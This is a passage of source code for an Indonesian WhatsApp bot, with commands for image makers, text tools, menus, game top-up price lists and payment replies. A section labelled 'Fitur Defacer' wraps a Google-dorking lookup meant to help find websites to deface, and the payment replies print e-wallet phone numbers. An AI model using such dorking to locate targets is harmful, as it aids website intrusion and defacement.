						cap = `Ini kak ${pushname} \nUdah jadi pesanannya`
						riu = await getBuffer(`https://api.vhtear.com/glow_metallic?text=${query}&apikey=${VthearApi}`)
						client.sendMessage(from, riu, image, {quoted: mek, caption: cap})
						break
				case 'narutomaker':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
							if (!isPremium) return reply(mess.only.premium)
						reply(mess.wait)
						query = args.join(" ")
						cap = `Ini kak ${pushname} \nUdah jadi pesanannya`
						riu = await getBuffer(`https://api.vhtear.com/naruto_text?text=${query}&apikey=${VthearApi}`)
						client.sendMessage(from, riu, image, {quoted: mek, caption: cap})
						break
					
					case 'fuckboy':
					case 'fuckgirl':
					case 'bucinserti':
					case 'toloserti':
					case 'goodboy':
					case 'goodgirl':
					case 'badboy':
					case 'badgirl':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
						if (!isPremium) return reply(mess.only.premium)
		         		if (args.length == 0) return reply(`Example: ${prefix + command} Nanda`)
						reply(`tunggu yaahh ${pushname} kagak bakal lama. *Nggak kayak Nunggu si dia yang ngga pernah Datang Datang*`)
						query = args.join(" ")
						cap = `Ini kak ${pushname} \nUdah jadi pesanannya`
						riu = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=${LolApi}&name=${query}`)
						client.sendMessage(from, riu, image, {quoted: mek, caption: cap})
						break
			case 'pacarserti':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				if (!isPremium) return reply(mess.only.premium)
				if (args.length == 0) return reply(`Example: ${prefix + command} Ivan & Nanda`)
			    reply( `tunggu yaahh ${pushname} kagak bakal lama. *Nggak kayak Nunggu si dia yang ngga pernah Datang Datang*`)
				ini_nama = args.join(" ").split("&")
				cap = `Ini kak ${pushname} \nUdah jadi pesanannya`
				nama1 = ini_nama[0].trim()
				nama2 = ini_nama[1].trim()
				riu = await getBuffer(`http://api.lolhuman.xyz/api/pacarserti?apikey=${LolApi}&name1=${nama1}&name2=${nama2}`)
				client.sendMessage(from, riu, image, {quoted: mek,  caption: cap})
				break

//akhir kreator
			    
			    case 'infoalamat':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
			    reply(mess.wait)
                    anu = await fetchJson(`https://api.vhtear.com/infoalamat?query=${body.slice(12)}&apikey=${VthearApi}`, {method: 'get'})
			        client.sendMessage(from, `${anu.result.data}`, text, {quoted: mek})
			        await limitAdd(sender) 
			        break 
			    case 'tinyurl':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
			    reply(mess.wait)
                    anu = await fetchJson(`https://tobz-api.herokuapp.com/api/tinyurl?url=${body.slice(9)}&apikey=${TobzApi}`)
			        tinyurl = `${anu.result}`
			        reply(tinyurl)
			        await limitAdd(sender) 
			        break
			  
		    case 'map':
			    if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
			    reply(mess.wait)
                anu = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`, {method: 'get'})
                buffer = await getBuffer(anu.gambar)
                client.sendMessage(from, buffer, image, {quoted: mek, caption: `${body.slice(5)}`})
				await limitAdd(sender) 
				break 
				case 'url2img':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					tipelist = ['desktop','tablet','mobile']
					if (args.length < 1) return reply('Tipenya apa gan?')
					if (!tipelist.includes(args[0])) return reply('Tipe desktop|tablet|mobile')
					if (args.length < 2) return reply('Urlnya mana gan?')
					if (!isUrl(args[1])) return reply(mess.error.Iv)
					reply(mess.wait)
					anu = await fetchJson(`https://mhankbarbar.tech/api/url2image?tipe=${args[0]}&url=${args[1]}&apiKey=${BarBarApi}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					url2img = await getBuffer(anu.result)
					client.sendMessage(from, url2img, image, {quoted: mek})
					await limitAdd(sender)
					break 
					case 'notif':
                        if (!isOwner) return reply(mess.only.ownerB)
                        client.updatePresence(from, Presence.composing)
                        teks = `Notif dari @${sender.split("@")[0]}\nPesan : ${body.slice(7)}`
                        group = await client.groupMetadata(from);
                        member = group['participants']
                        jids = [];
                        member.map(async adm => {
                        jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
                        })
                        options = {
                        text: teks,
                        contextInfo: {
                        mentionedJid: jids
                        },
                        quoted: mek
                         } 
                        client.sendMessage(from, options, text)
                         break
					
		case 'jadwalsholat2':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
					if (args.length < 1) return reply('kotanya mana?')
					sholat = `${body.slice(14)}`
					anu = await fetchJson(`https://olabdev-api.herokuapp.com/api/jadwalshalat?kota=${sholat}&apikey=OggyBot`, {method: 'get'})
					reply(mess.wait)
					if (anu.result) return reply(anu.result)
					jsol = `Jadwal sholat di *${sholat}* hari ini adalah\n\n➸ *Subuh :* ${anu.Subuh} WIB\n*➸ Dzuhur :* ${anu.Dzuhur} WIB\n*➸ Ashar :* ${anu.Ashar} WIB\n*➸ Maghrib :* ${anu.Maghrib} WIB\n*➸ Isya :* ${anu.Isya} WIB`
					client.sendMessage(from, jsol, text, {quoted: mek})
					await limitAdd(sender) 
					break 
               case 'pastebin':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
				reply(mess.wait)
				paste = `${body.slice(10)}`
                   anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${paste}`, {method: 'get'})
                   client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
                   await limitAdd(sender) 				
                   break 
		
		case 'bitly':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			link = `${body.slice(7)}`
			anu = await fetchJson(`https://tobz-api.herokuapp.com/api/bitly?url=${link}&apikey=${TobzApi}`, {method: 'get'})
			bitly = `${bitlyy.result}`
			client.sendMessage(from, anu, text, {quoted: mek})
			await limitAdd(sender) 
			break  
			case 'textstyle':
				    if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
			reply(mess.wait)
			style = `${body.slice(11)}`
			anu = await fetchJson(`https://api.arugaz.my.id/api/random/text/fancytext?text=${style}`, {method: 'get'})
			reply (anu.result)
			await limitAdd(sender) 
			break  
			case 'pantun2':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
			anu = await fetchJson(`https://api.arugaz.my.id/api/random/text/pantun`, {method: 'get'})
			client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
			await limitAdd(sender) 
			break  
			
		case 'jamdunia':
			if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
			reply(mess.wait)
		 jamdunia = `${body.slice(10)}`
			anu = await fetchJson(`https://api.i-tech.id/tools/jam?key=${TechApi}&kota=${jamdunia}`, {method: 'get'})
			wtime = `*${anu.timezone}*\n*${anu.date}*\n*${anu.time}*`
			client.sendMessage(from, wtime, text, {quoted: mek})
			await limitAdd(sender) 
			break  

// Fitur Defacer

				case 'dorking':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				reply(mess.wait)
				dork = `${body.slice(9)}`
					anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/dorking?dork=${dork}`, {method: 'get'})
					hasil = `${anu.result}`
					client.sendMessage(from, hasil, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'encode64':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				encode64 = `${body.slice(10)}`
				anu = await fetchJson(`https://api.i-tech.id/hash/bs64?key=${TechApi}&type=encode&string=${encode64}`, {method: 'get'})
				client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break 
				case 'decode64':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				decode64 = `${body.slice(10)}`
					anu = await fetchJson(`https://api.i-tech.id/hash/bs64?key=${TechApi}&type=decode&string=${decode64}`, {method: 'get'})
					client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'decode32':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				decode32 = `${body.slice(10)}`
					anu = await fetchJson(`https://api.i-tech.id/hash/bs32?key=${TechApi}&type=decode&string=${decode32}`, {method: 'get'})
					client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'encode32':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				encode32 = `${body.slice(10)}`
					anu = await fetchJson(`https://api.i-tech.id/hash/bs32?key=${TechApi}&type=encode&string=${encode32}`, {method: 'get'})
					client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'encbinary':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				encbinary = `${body.slice(11)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/binary/?encode=${encbinary}`, {method: 'get'})
					client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'decbinary':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				decbin = `${body.slice(11)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/binary/?decode=${decbin}`, {method: 'get'})
					client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'encoctal':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				encoc = `${body.slice(10)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/octal/?encode=${encoc}`, {method: 'get'})
				    client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender)
					break  
				case 'decoctal':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				decoc = `${body.slice(10)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/octal/?decode=${decoc}`, {method: 'get'})
					client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break  
				case 'becrypt':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				becry = `${body.slice(10)}`
				anu = await fetchJson(`https://api.i-tech.id/hash/bcrypt?key=${TechApi}&string=${becry}`, {method: 'get'})
				client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
				await limitAdd(sender) 
				break 
					case 'hashidentifier':
						if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
					  hash = `${body.slice(16)}`
					  anu = await fetchJson(`https://freerestapi.herokuapp.com/api/v1/hash-identifier?hash=${hash}`)
					  hasilhash = `Tipe: *${anu.hash_type}*\nChar Tipe: *${anu.char_type}*`
					  client.sendMessage(from, hasilhash, text, {quoted: mek})
					  await limitAdd(sender)
					  break 

 //AKSES MENU
				case 'dsmenu':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
					if (isBanned) return reply(mess.only.benned)
					client.sendMessage(from, dsmenu(prefix, Laporowner), text, {quoted: mek})
					break 
				case 'adminmenu':
					if (isBanned) return reply(mess.only.benned)
					if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
					uptime = process.uptime()		
					client.sendMessage(from, adminmenu(prefix, Laporowner), text, {quoted: mek})
					break 
				case 'creatormenu':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
					if (isBanned) return reply(mess.only.benned)						
					client.sendMessage(from, creator(prefix, Laporowner), text, {quoted: mek})
					break 
				case 'funmenu':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
					if (isBanned) return reply(mess.only.benned)				
					client.sendMessage(from, fun(prefix, Laporowner), text, {quoted: mek})
					break 
				case 'grupmenu':
				case 'groupmenu':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
					if (isBanned) return reply(mess.only.benned)					
					client.sendMessage(from, grup(prefix, Laporowner), text, {quoted: mek})
					break 
				case 'nsfwmenu':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
					if (isBanned) return reply(mess.only.benned)				
				    client.sendMessage(from, adult(prefix, Laporowner), text, {quoted: mek})
					break 
		     	case 'othermenu':
				    if (!isRegistered) return reply(mess.only.userB)
				    if (isLimit(sender)) return reply(mess.limituser)
				    if (isBanned) return reply(mess.only.benned)					
					client.sendMessage(from, others(prefix, Laporowner), text, {quoted: mek})
					break 
			    case 'ownermenu':
				    if (!isOwner) return reply(mess.only.ownerB)					
					client.sendMessage(from, owner(prefix, Laporowner), text, {quoted: mek})
				    break 
				case 'islammenu':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
					if (isBanned) return reply(mess.only.benned)
				    await costum(islam(prefix, Laporowner), text, {quoted: mek})
					break 
				case 'animemenu':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
					if (isBanned) return reply(mess.only.benned)				
					client.sendMessage(from, animemenu(prefix, Laporowner), text, {quoted: mek})
					break 

// akhir encrypt & decrypt Fitur
            
         case 'moddroid':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)	
			data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${body.slice(10)}&apikey=${TobzApi}`)
			hepi = data.result[0] 
			teks = `*Nama*: ${data.result[0].title}\n*publisher*: ${hepi.publisher}\n*mod info:* ${hepi.mod_info}\n*size*: ${hepi.size}\n*latest version*: ${hepi.latest_version}\n*genre*: ${hepi.genre}\n*link:* ${hepi.link}\n*download*: ${hepi.download}`
			buffer = await getBuffer(hepi.image)
			client.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
			await limitAdd(sender)
			break
		case 'happymod':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			data = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${body.slice(10)}&apikey=${TobzApi}`)
			hupo = data.result[0] 
			teks = `*Nama*: ${data.result[0].title}\n*version*: ${hupo.version}\n*size:* ${hupo.size}\n*root*: ${hupo.root}\n*purchase*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
			buffer = await getBuffer(hupo.image)
			client.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
			await limitAdd(sender)
			break
        case 'ffid':
reply(`*💫 LIST DM FF VIA ID 💫*

5           💎       Rp            798
10         💎       Rp         1.596
20         💎       Rp         2.660
50         💎       Rp         6.384
70         💎       Rp         8.778
100       💎       Rp       12.768
140       💎       Rp       17.490
210       💎       Rp       26.334
355       💎       Rp       43.890
500       💎       Rp       62.224
720       💎       Rp       87.780
1000     💎       Rp     123.500
1075     💎       Rp     131.700
1440     💎       Rp     183.500
2000     💎       Rp     241.000
4000     💎       Rp     478.800
7290     💎       Rp     866.500

*💫MEMBERSHIP💫*
MM                    Rp       26.500
MB                     Rp     132.500
MB + MM          Rp     159.500`)     
break

/*case 'pay2':
reply(`*PEMBAYARAN VIA² ✅*

*💫 SCAN PP GRUB 💫* || *GOPAY*
A / N : N

*💫 081352259378 💫* || *DANA*
A / N : M 

❌ *NOTE !! KESALAHAN NOMER TUJUAN,ADMIN TIDAK AKAN BERTANGGUNG JAWAB 🙏*`)
	break */
//	case 'diamond':
		case 'diamondff':
		case 'diamondml':
			reply(`*DIAMOND FF VIA ID r268*
			_Proses 1 - 5 menit_
			_Via ID_
			
			5         💎   Rp      804
			10        💎   Rp      1.704
			20        💎   Rp      2.680
			50        💎   Rp      6.432
			70        💎   Rp      8.844
			100       💎   Rp      12.850
			140       💎   Rp      17.688
			210       💎   Rp      26.500
			355       💎   Rp      44.220
			500       💎   Rp      62.500
			720       💎   Rp      88.440
			1000      💎   Rp      121.500
			1440      💎   Rp      182.500
			2000      💎   Rp      241.200
			
			MM          =  Rp      26.800
			MB          =  Rp      134.000
			MB + MM     =  Rp      160.800`)
			break 
		case 'pay1':
reply(`*Payment¹ ✅*

*💫 SCAN MINTA KE PM💫* || *DANA*
A / N : RAH**

*💫 089526565831 💫* || *DANA*
A / N : RAH**

*💫 089526565831 💫* || *DANA*
A / N : RAH**

*💫 089526565831 💫* || *DANA*
A / N : RAH**

❌ *NOTE !! KESALAHAN NOMER TUJUAN,ADMIN TIDAK AKAN BERTANGGUNG JAWAB 🙏*`)
break
case 'pay2':
reply(`*Payment² ✅*

*💫 SCAN PP GRUB 💫* || *DANA*
A / N : RAH**

*💫 089526565831 💫* || *DANA*
A / N : M 

❌ *NOTE !! KESALAHAN NOMER TUJUAN,ADMIN TIDAK AKAN BERTANGGUNG JAWAB 🙏*`)
break
case 'mlid':
reply(`*💫 LIST DM ML FAST  💫*

86        💎    Rp        18.550
172      💎    Rp        37.100
257      💎    Rp        55.650
344      💎    Rp        74.200
429      💎    Rp        92.750
514      💎    Rp      111.300
600      💎    Rp      129.850
706      💎    Rp      148.400
878      💎    Rp      185.500
963      💎    Rp      204.050
1050    💎    Rp      227.600
1220    💎    Rp      259.700
1412    💎    Rp      296.800
2195    💎    Rp      441.225
3688    💎    Rp      734.050
5532    💎    Rp   1.124.300
9288    💎    Rp   1.899.000

*💫 STARLIGHT & TWILIGHT 💫*

SL/TL    =      Rp      125.840
SL +       =      Rp      284.600`)
break
case 'format':
reply(`FORMAT TOP UP MOBILE LEGENDS

NICKNAME :
ID GAME :
SERVER :
JUMLAH TOP UP :
SISA DM :
ORDER : 
ORDER DATE : ${time}

NOTE !!
KESALAHAN ID MAKA BUKAN TANGGUNG JAWAB ADMIN`)
break

case 'p':
 reply(`「 *PROSES* 」
\`\`\`Orderan Anda Sedang Kami Proses Mohon Di Tunggu !!\`\`\`
*> ${time} <*`)
    break
 case 'o':
reply(` *「 DONE 」*
\`\`\`Terima Kasih  Atas Orderan Anda,Di Tunggu Next Orderan Nya\`\`\`

*> IvAN STORE <*`)
break

default:
// ANTIVIRTEX BY IXB TEAM
		    if (budy.length > 3500) {
	        if (!isGroup) return
	        if (!isAntiVirtex) return
			if (isOwner) return reply(`${pushname} adalah owner bot, bot tidak akan kick kamu`)
		    if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
	        client.updatePresence(from, Presence.composing)
	        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
	        reply(`Virtext Terdeteksi maaf ${pushname} anda akan di kick dari group`)
	        setTimeout( () => {
	        client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
			client.sendMessage(from, penangkalvirtext(), text, {quoted: mek})
			client.sendMessage(from, penangkalvirtext(), text, {quoted: mek})
			client.blockUser(sender, "add")
	        }, 0)
	        }
// ANTILINK BY IXB TEAM 
		    if (budy.includes('://chat.whatsapp.com/')){
			if (!isGroup) return
			if (!isAntilink) return
			if (isOwner) return reply(`${pushname} adalah owner bot, bot tidak akan kick kamu`)
			if (isGroupAdmins) return reply(`${pushname} Adalah admin group kamu tidak akan di kick`)
			client.updatePresence(from, Presence.composing)
			var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
			reply(`*「 GROUP LINK DETECTOR 」* \nKamu mengirimkan link group chat, maaf anda akan di kick dari group:(`)
			setTimeout( () => {
			client.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
			}, 0)
			}
// DJ KHUSUS PREMIUM
			if (budy.toLowerCase() == "cinta") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
		     	empat = fs.readFileSync('./audio/cinta100%.mp3');
		    	client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
		    	}
			if (budy.toLowerCase() == "darkside") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/darkside.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "gemes") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/gemes.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "goyang") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/goyangdumang.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "jadikan") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/jadikanakuyangkedua.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "masih") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/masihmencintainya.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "playdate") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/playdate.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "tonight") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/tonight.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "aduh") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
			    empat = fs.readFileSync('./audio/aduh.mp3');
		    	client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
			    }
			if (budy.toLowerCase() == "whitecoffe") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/whitecoffe.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "tapi") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/tapi.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "setiap") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/setiap.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "semua") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/semua.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "rindu") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/rindu.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "iri") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/iri.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "mantap") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/mantap.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "ampun") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/ampun.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "anjay") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/anjay.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "dingin") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/dingin.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "foya") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/foya.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
			if (budy.toLowerCase() == "gatalsa") {
			if (!isPremium) return reply('*DJ KHUSUS PREMIUM*')
				empat = fs.readFileSync('./audio/gatalsa.mp3');
				client.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
				}
		    if (budy.toLowerCase() == "terima kasih"){
				reply('Sama-sama kak:)')
				}
			if (budy.toLowerCase() == "pagi"){
				reply('Pagi juga kak:)')
				}
		    if (budy.toLowerCase() == "malam"){
				reply('Malam juga kak:)')
				}
			if (budy.toLowerCase() == "siang"){
				reply('Siang juga kak:)')
				}
			if (budy.toLowerCase() == "sore"){
			    reply('Sore juga kak. jangan lupa mandi ☺️')
				}
			if (messagesC.includes(`${OwnerNumber}`)){
				reply( ' ivan lagi sibuk kak, jangan di tag:)')
				}
			if (messagesC.includes( "makasih")){
		    	reply('Sama-sama kak:)')
				}
			if (budy.toLowerCase() == "bot") {
		    	reply(`ada apa ${pushname}, kok lu manggil2 gue`)
				} 
			if (budy.toLowerCase() == "hi") {
		    	reply(`Hai kak ${pushname}, Ada yang bisa aku bantu?`)
				} 
			if (budy.toLowerCase() == "halo") {
		    	reply(`Hai kak ${pushname}, Ada yang bisa aku bantu?`)
				} 
			if (budy.toLowerCase() == "assalamualaikum") {
				reply(`*Ivan-BOT* \n_Waalaikumsalam kakak:)_`)
				}
			if (budy.toLowerCase() == "assalamu'alaikum") {
				reply(`*IvAn-BOT* \n_Waalaikumsalam kakak:)_`)
				}
			if (messagesC.includes("intro")) {
			if (!isGroupAdmins) return
				reply(`Nama lengkap:\nNama panggilan:\nHobi:\nUmur:\nKelas:\nTinggi badan:\nBerat badan :\nAgama:\nGolongan darah:\nStatus:\nNama pacar:\nJumlah mantan:\nNama mantan:\nNama bapak:\nNama ibu:\nNama kakak:\nNama adek:\nNama kakek:\nNama nenek:\nNama bibi:\nNama paman:\nNama saudara:\nKTP:\nSIM:\nSTNK:\nBPKB:\nKK:\nAlamat rumah:\nRT:\nRW:\nKELURAHAN:\nKECAMATAN:\nKABUPATEN:\nKOTA:\nPROVINSI:\nPLANET:\nGALAKSI:\nLANGIT:\nDARATAN:\nLAUTAN:\nKEPULAUAN:\nSAMUDRA:\nUKURAN SEPATU:\nUKURAN BAJU:\nUKURAN CELANA:\nLEBAR PINGGANG:\nPANJANG TANGAN:\nPANJANG KAKI:\nMAKANAN FAVORIT:\nMINUMAN FAVORIT:\nFILM FAVORIT:\nSINETRON FAVORIT:\nGAME FAVORIT:\nANIME FAVORIT:\nWAIFU:\nHUSBU:\nCHANNEL YOUTUBE:\nINSTAGRAM:\nTWITTER:\nSNAPCHAT:\nFACEBOOK:\nTIK TOK:\nLIKEE:\nMUSIC FAVORIT:\nSIFAT:\nSIKAP:\nZODIAK:\nTANGGAL LAHIR:\nMERK HP:\nMERK MOTOR:\nMERK MOBIL:\nTINGKAT RUMAH:\nALAMAT SEKOLAH:\nUkuran dalaman :\nUkuran atasan :\nDiameter kepala :\nDiameter perut :\nDiameter lengan :\nDiameter paha :\nDiameter lutut :\nDiameter betis:\nPanjang tangan :\nPanjang kaki :\nPanjang kepala :\nLebar hidung :\nCita cita :\nKalau makan telur telur ceplok atau dadar:\nwrna favorit:\nhewan favorit:\npunya kutu?:\nlagi dimana pasti di rumah:\nlagi napas ya:\npernah berak?:\npernah tidur?:\nukuran rambut:\npunya bantal 